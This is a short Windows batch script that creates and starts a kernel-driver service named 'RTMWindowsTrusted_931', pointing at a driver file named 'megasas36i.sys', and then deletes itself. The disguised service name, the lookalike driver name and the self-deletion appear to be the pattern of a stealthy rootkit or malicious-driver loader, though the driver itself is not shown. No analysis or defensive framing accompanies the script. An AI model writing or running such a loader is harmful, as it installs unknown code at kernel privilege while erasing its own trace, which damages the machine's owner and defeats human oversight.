@echo off
cd %~dp0
sc create RTMWindowsTrusted_931 binpath=C:\Windows\System32\drivers\megasas36i.sys type=kernel
sc start RTMWindowsTrusted_931
del "%~f0"